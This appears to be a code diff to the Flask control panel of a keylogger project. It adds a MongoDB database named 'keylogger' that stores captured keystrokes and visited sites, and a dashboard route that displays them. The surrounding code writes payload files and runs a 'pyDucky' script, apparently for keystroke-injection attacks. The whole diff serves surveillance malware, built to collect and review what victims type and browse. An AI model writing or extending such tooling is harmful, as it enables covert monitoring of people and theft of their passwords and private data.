@@ -5,6 +5,7 @@ import os
 import sys
 import time
 import datetime
+import pymongo
 
 app = Flask(__name__, template_folder=os.path.dirname(os.path.abspath(__file__)))
 
@@ -19,10 +20,29 @@ pyDucky_path = os.path.join(current_directory, "pyDucky.py")
 logs_file = 'keylogs.txt'
 keylogs = []  # List to store keylogs
 
+# MongoDB connection
+client = pymongo.MongoClient("mongodb://localhost:27017/")
+db = client["keylogger"]
+keystroke_collection = db["keystrokes"]
+site_collection = db["sites"]
+
+# @app.route('/')
+# def home():
+#     formatted_logs = format_logs(keylogs)
+#     return render_template('index.html', logs=formatted_logs)
+
 @app.route('/')
 def home():
-    formatted_logs = format_logs(keylogs)
-    return render_template('index.html', logs=formatted_logs)
+    # Fetch keystrokes and visited sites from MongoDB
+    keystrokes = keystroke_collection.find({})
+    sites = site_collection.find({})
+
+    # Format keystrokes and sites data for display
+    keystrokes_data = [f"[{keystroke['timestamp']}] > {keystroke['keystroke']}" for keystroke in keystrokes]
+    sites_data = [f"[{site['timestamp']}] > {site['site']}" for site in sites]
+
+    return render_template('index.html', keystrokes=keystrokes_data, sites=sites_data)
+
 
 @app.route('/payload', methods=['GET', 'POST'])
 def payload():
@@ -40,7 +60,6 @@ def save_payload(payload_data):
         os.remove(payload_file_path)  # Remove existing payload.txt file
     with open(payload_file_path, 'w') as file:
         file.write(payload_data)
-
 
 def execute_payload_script():
     subprocess.run(['python', pyDucky_path])
